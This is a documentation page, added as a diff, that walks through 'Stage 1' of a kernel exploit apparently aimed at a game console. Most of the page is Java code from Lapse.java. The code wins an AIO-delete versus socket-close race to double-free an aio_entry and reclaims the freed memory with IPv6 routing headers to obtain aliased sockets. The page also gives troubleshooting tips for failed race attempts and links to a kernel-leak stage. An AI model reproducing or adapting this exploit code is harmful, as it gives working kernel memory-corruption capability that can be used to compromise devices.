@@ -1,0 +1,484 @@
+---
+title: 'Stage 1: Double-Free on reqs2'
+description: 'First memory corruption using AIO race conditions'
+---
+
+# Stage 1: Double-Free on reqs2
+
+Stage 1 achieves the first memory corruption by exploiting a race condition between AIO deletion and socket closure. This creates a double-free on an `aio_entry` structure (reqs2) which is then reclaimed with IPv6 routing headers to create aliased sockets.
+
+## Overview
+
+Implemented in `Lapse.executeStage1()` at `Lapse.java:257-388`.
+
+```java
+public static int[] executeStage1() {
+    Status.println("=== STAGE 1: Double-free AIO ===");
+    // Setup race, win race, verify aliasing
+    // Returns: [aliasedSd1, aliasedSd2] or null
+}
+```
+
+## The Double-Free Vulnerability
+
+### Target Structure
+
+The exploit targets **aio_entry** structures allocated in the kernel's **0x80 byte zone**:
+
+```c
+// Kernel structure (simplified)
+struct aio_entry {
+    int ar2_cmd;              // +0x00: AIO command
+    // ... fields ...
+    void *ar2_info;           // +0x18: Pointer to aio_info
+    void *ar2_batch;          // +0x20: Pointer to batch
+    // ... more fields ...
+    int ar2_result_state;     // +0x38: Result state
+    struct file *ar2_file;    // +0x40: File pointer (must be NULL)
+    // ... rest of structure ...
+};
+```
+
+### The Race Condition
+
+The vulnerability exists in the interaction between:
+
+1. **aio_delete()** - Frees aio_entry and calls `fput()` on associated file
+2. **soclose()** - Socket close with SO_LINGER delays in TCP disconnect
+3. **fdrop()** - File reference counting that eventually frees the structure
+
+<Warning>
+When both the main thread and a worker thread call aio_delete() simultaneously while soclose() holds a reference, the aio_entry can be freed twice.
+</Warning>
+
+## Step 1: Socket Setup for Race
+
+### UDP Sockets for Reclaim
+
+From `Lapse.java:261-264`:
+
+```java
+sockets = new int[NUM_SDS];  // NUM_SDS = 64
+for (int i = 0; i < NUM_SDS; i++) {
+    sockets[i] = Helper.createUdpSocket();
+}
+```
+
+These 64 UDP sockets will later be used to allocate IPv6 routing headers that reclaim the freed aio_entry memory.
+
+### TCP Listen Socket
+
+From `Lapse.java:266-296`:
+
+```java
+// Setup server address 127.0.0.1:5050
+Buffer serverAddr = new Buffer(16);
+serverAddr.fill((byte)0);
+serverAddr.putByte(1, (byte)Helper.AF_INET);
+serverAddr.putShort(2, Helper.htons(5050));
+serverAddr.putInt(4, Helper.aton("127.0.0.1"));
+
+int listenSd = Helper.createTcpSocket();
+
+// Set SO_REUSEADDR to allow quick rebind
+Buffer enable = new Buffer(4);
+enable.putInt(0, 1);
+Helper.setSockOpt(listenSd, Helper.SOL_SOCKET, Helper.SO_REUSEADDR, enable, 4);
+
+// Bind and listen
+long bindResult = Helper.syscall(Helper.SYS_BIND, (long)listenSd, 
+                                serverAddr.address(), 16L);
+if (bindResult != 0) {
+    Status.println("Bind failed: " + bindResult);
+    Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
+    return null;
+}
+
+long listenResult = Helper.syscall(Helper.SYS_LISTEN, (long)listenSd, 1L);
+```
+
+## Step 2: Race Loop
+
+### Main Race Iteration
+
+From `Lapse.java:298-378`:
+
+```java
+int numReqs = 3;       // 3 AIO requests per batch
+int whichReq = numReqs - 1;  // Target the 3rd request (index 2)
+
+for (int attempt = 1; attempt <= NUM_RACES; attempt++) {  // NUM_RACES = 100
+    Status.println("Race attempt " + attempt + "/" + NUM_RACES);
+
+    // Create client socket
+    int clientSd = Helper.createTcpSocket();
+    
+    // Connect to localhost:5050
+    long connectResult = Helper.syscall(Helper.SYS_CONNECT, (long)clientSd, 
+                                       serverAddr.address(), 16L);
+    
+    // Accept connection
+    long connSd = Helper.syscall(Helper.SYS_ACCEPT, (long)listenSd, 0L, 0L);
+```
+
+### SO_LINGER Configuration
+
+This is the key to creating the race window:
+
+From `Lapse.java:325-331`:
+
+```java
+// Set SO_LINGER to force soclose() delay
+Buffer lingerBuf = new Buffer(8);
+lingerBuf.fill((byte)0);
+lingerBuf.putInt(0, 1);  // l_onoff - linger active
+lingerBuf.putInt(4, 1);  // l_linger - 1 second
+
+Helper.setSockOpt(clientSd, Helper.SOL_SOCKET, Helper.SO_LINGER, lingerBuf, 8);
+```
+
+<Note>
+**SO_LINGER with timeout** causes close() to block while attempting graceful TCP shutdown. This creates a window where the file descriptor is being closed but the underlying socket structure is still referenced.
+</Note>
+
+### AIO Submission
+
+From `Lapse.java:333-347`:
+
+```java
+// Create AIO requests
+Buffer reqs = Helper.createAioRequests(numReqs);
+Buffer aioIds = new Buffer(4 * numReqs);
+
+// Set client socket fd in the target request (3rd one)
+reqs.putInt(whichReq * 0x28 + 0x20, clientSd);
+
+// Submit AIO requests
+long submitResult = Helper.aioSubmitCmd(Helper.AIO_CMD_MULTI_READ, 
+                                       reqs.address(), 
+                                       numReqs, 
+                                       Helper.AIO_PRIORITY_HIGH, 
+                                       aioIds.address());
+
+// Immediately cancel and poll
+Buffer errors = new Buffer(4 * numReqs);
+Helper.aioMultiCancel(aioIds.address(), numReqs, errors.address());
+Helper.aioMultiPoll(aioIds.address(), numReqs, errors.address());
+```
+
+### Triggering the Race
+
+From `Lapse.java:353-368`:
+
+```java
+// Close client socket to trigger fdrop() reference counting
+Helper.syscall(Helper.SYS_CLOSE, (long)clientSd);
+
+// Execute the race
+long requestAddr = aioIds.address() + (whichReq * 4);
+int[] aliasedPair = raceOne(requestAddr, (int)connSd, sockets);
+
+// Cleanup remaining AIOs
+Helper.aioMultiDelete(aioIds.address(), numReqs, errors.address());
+Helper.syscall(Helper.SYS_CLOSE, connSd);
+
+if (aliasedPair != null) {
+    Status.println("SUCCESS: Won race at attempt " + attempt);
+    Status.println("Aliased socket pair: " + aliasedPair[0] + ", " + aliasedPair[1]);
+    Helper.syscall(Helper.SYS_CLOSE, (long)listenSd);
+    return aliasedPair;
+}
+```
+
+## Step 3: DeleteWorkerThread Race Mechanism
+
+### Worker Thread Implementation
+
+From `Lapse.java:77-115`:
+
+```java
+public static class DeleteWorkerThread extends Thread {
+    private long requestAddr;
+    private Buffer errors;
+    private int pipeFd;
+    private volatile boolean ready = false;
+    private volatile boolean completed = false;
+    private volatile int workerError = -1;
+
+    public void run() {
+        try {
+            ready = true;
+
+            // Block on pipe read
+            Buffer pipeBuf = new Buffer(8);
+            Helper.syscall(Helper.SYS_READ, (long)pipeFd, pipeBuf.address(), 1L);
+
+            // Execute AIO deletion
+            Helper.aioMultiDelete(requestAddr, 1, errors.address() + 4);
+
+            workerError = errors.getInt(4);
+            completed = true;
+
+        } catch (Exception e) {
+            Status.println("Worker thread error: " + e.getMessage());
+            workerError = -1;
+            completed = true;
+        }
+    }
+}
+```
+
+### Race Execution
+
+From `Lapse.java:390-497`:
+
+```java
+private static int[] raceOne(long requestAddr, int tcpSd, int[] testSockets) {
+    try {
+        Buffer sceErrs = new Buffer(8);
+        sceErrs.putInt(0, -1);  // Main thread error
+        sceErrs.putInt(4, -1);  // Worker thread error
+
+        // Create pipe for synchronization
+        Buffer pipe = new Buffer(8);
+        long pipeResult = Helper.syscall(Helper.SYS_SOCKETPAIR, (long)Helper.AF_UNIX, 
+                                       (long)Helper.SOCK_STREAM, 0L, pipe.address());
+
+        int pipeReadFd = pipe.getInt(0);
+        int pipeWriteFd = pipe.getInt(4);
+
+        // Start worker thread
+        DeleteWorkerThread worker = new DeleteWorkerThread(requestAddr, sceErrs, pipeReadFd);
+        worker.start();
+
+        // Wait for worker to be ready
+        while (!worker.isReady() && waitCount < 1000) {
+            Thread.yield();
+            waitCount++;
+        }
+        
+        // Signal worker to proceed
+        Helper.syscall(Helper.SYS_WRITE, (long)pipeWriteFd, pipeBuf.address(), 1L);
+
+        // Yield once to let worker start
+        Thread.yield();
+
+        // Poll AIO state while worker should be blocked in soclose()
+        Buffer pollErr = new Buffer(4);
+        Helper.aioMultiPoll(requestAddr, 1, pollErr.address());
+        int pollRes = pollErr.getInt(0);
+
+        // Check TCP state
+        Buffer infoBuffer = new Buffer(0x100);
+        int infoSize = Helper.getSockOpt(tcpSd, Helper.IPPROTO_TCP, 
+                                        Helper.TCP_INFO, infoBuffer, 0x100);
+        int tcpState = (infoSize > 0) ? (infoBuffer.getByte(0) & 0xFF) : -1;
+
+        boolean wonRace = false;
+
+        if (pollRes != Helper.SCE_KERNEL_ERROR_ESRCH && tcpState != Helper.TCPS_ESTABLISHED) {
+            // Execute main delete
+            Helper.aioMultiDelete(requestAddr, 1, sceErrs.address());
+            wonRace = true;
+
+            Status.println("RACE WON: pollRes=" + Integer.toHexString(pollRes) +
+                          " (!=0x80020003), tcpState=" + tcpState + " (!=4)");
+        }
+```
+
+<Warning>
+The race is won when:
+1. pollRes != SCE_KERNEL_ERROR_ESRCH (0x80020003) - AIO still exists
+2. tcpState != TCPS_ESTABLISHED (4) - Socket is closing
+3. Both conditions mean we're in the middle of soclose() with reference held
+</Warning>
+
+### Double-Free Verification
+
+From `Lapse.java:460-484`:
+
+```java
+// Wait for worker to complete
+try {
+    worker.join(2000);
+} catch (InterruptedException e) {
+    // Continue
+}
+
+// Check race results
+if (wonRace && worker.isCompleted()) {
+    int mainError = sceErrs.getInt(0);
+    int workerError = worker.getWorkerError();
+
+    Status.println("Race errors: main=" + mainError + ", worker=" + workerError);
+
+    // Both errors must be equal and 0 for successful double-free
+    if (mainError == workerError && mainError == 0) {
+        int[] aliasedPair = makeAliasedRthdrs(testSockets);
+        
+        if (aliasedPair != null) {
+            Status.println("Socket aliasing verified - memory corruption confirmed!");
+            return aliasedPair;
+        } else {
+            Status.println("Socket aliasing failed - double-free didn't cause expected corruption");
+        }
+    }
+}
+```
+
+<Note>
+**Success condition**: Both main thread and worker thread return error 0, meaning both successfully deleted the same AIO request. This is the double-free.
+</Note>
+
+## Step 4: Socket Aliasing via Routing Headers
+
+### Memory Reclaim Strategy
+
+After the double-free, the freed 0x80 byte memory can be reclaimed by allocating IPv6 routing headers:
+
+From `Lapse.java:500-546`:
+
+```java
+public static int[] makeAliasedRthdrs(int[] sds) {
+    int markerOffset = 4;
+    int size = 0x80;
+    Buffer buf = new Buffer(size);
+    int rsize = Helper.buildRoutingHeader(buf, size);
+
+    for (int loop = 1; loop <= NUM_ALIAS; loop++) {  // NUM_ALIAS = 100
+
+        // Write unique markers to each socket's routing header
+        for (int i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
+            if (sds[i-1] >= 0) {
+                buf.putInt(markerOffset, i);  // Unique marker
+                Helper.setRthdr(sds[i-1], buf, rsize);
+            }
+        }
+
+        // Read back markers to detect aliasing
+        for (int i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
+            if (sds[i-1] >= 0) {
+                Helper.getRthdr(sds[i-1], buf, size);
+                int marker = buf.getInt(markerOffset);
+                
+                // If marker changed, sockets are aliased!
+                if (marker != i && marker > 0 && marker <= NUM_SDS) {
+                    int aliasedIdx = marker - 1;
+                    if (aliasedIdx >= 0 && aliasedIdx < sds.length && 
+                        sds[aliasedIdx] >= 0) {
+                        
+                        Status.println("Aliased rthdrs at attempt: " + loop +
+                                      " (found pair: " + sds[i-1] + " " + 
+                                      sds[aliasedIdx] + ")");
+
+                        int[] sdPair = new int[2];
+                        sdPair[0] = sds[i-1];
+                        sdPair[1] = sds[aliasedIdx];
+
+                        return sdPair;
+                    }
+                }
+            }
+        }
+    }
+
+    return null;
+}
+```
+
+### How Aliasing Works
+
+```
+Before Double-Free:
+┌──────────────────┐
+│ Socket A         │
+│ rthdr → Memory 1 │
+└──────────────────┘
+┌──────────────────┐
+│ Socket B         │
+│ rthdr → Memory 2 │
+└──────────────────┘
+
+After Double-Free + Reclaim:
+┌──────────────────┐
+│ Socket A         │──┐
+│ rthdr → Memory X │  │  Both point to
+└──────────────────┘  ├─ same memory!
+┌──────────────────┐  │
+│ Socket B         │──┘
+│ rthdr → Memory X │
+└──────────────────┘
+```
+
+When we write marker "5" to socket A and read marker "5" from socket B, we've confirmed they share memory.
+
+<Note>
+Aliased sockets provide a **read/write primitive** to the same kernel memory through two different file descriptors.
+</Note>
+
+## Memory State After Stage 1
+
+```
+┌─────────────────────────────────┐
+│ Freed aio_entry (0x80 bytes)    │
+│ ↓ Double-freed                  │
+│ ↓ Reclaimed by ip6_rthdr        │
+├─────────────────────────────────┤
+│ Socket A.ip6_rthdr → ●─────┐   │
+│                             │   │
+│ Socket B.ip6_rthdr → ●─────┘   │
+│                                 │
+│ Both sockets alias same memory  │
+└─────────────────────────────────┘
+```
+
+## Success Criteria
+
+✅ Stage 1 succeeds when:
+1. Race condition won (pollRes != 0x80020003, tcpState != 4)
+2. Both delete errors equal 0 (successful double-free)
+3. Socket aliasing detected (marker mismatch)
+4. Returns pair of aliased socket descriptors
+
+## Common Failure Points
+
+### All Race Attempts Failed
+
+```
+Error: All race attempts failed
+```
+
+**Cause**: Race timing too tight, not winning race window  
+**Solution**: Retry exploit, ensure CPU pinning succeeded
+
+### Race Won But No Aliasing
+
+```
+Double-free NOT achieved - error mismatch or non-zero errors
+Expected: both errors = 0, Got: main=-1, worker=0
+```
+
+**Cause**: Race won but one delete failed  
+**Solution**: System state inconsistent, reboot recommended
+
+### Socket Aliasing Failed
+
+```
+Socket aliasing failed - double-free didn't cause expected corruption
+```
+
+**Cause**: Memory reclaimed by something other than our sockets  
+**Solution**: Increase NUM_SDS or retry
+
+## Next Stage
+
+With aliased sockets established:
+
+→ [Stage 2: Kernel Leak](/technical/stage-2-kernel-leak) - Use aliasing to leak kernel addresses
+
+## Related Code
+
+- `Lapse.executeStage1()` - Main stage function (`Lapse.java:257`)
+- `Lapse.raceOne()` - Single race attempt (`Lapse.java:390`)
+- `Lapse.DeleteWorkerThread` - Worker thread for race (`Lapse.java:77`)
+- `Lapse.makeAliasedRthdrs()` - Socket aliasing verification (`Lapse.java:500`)
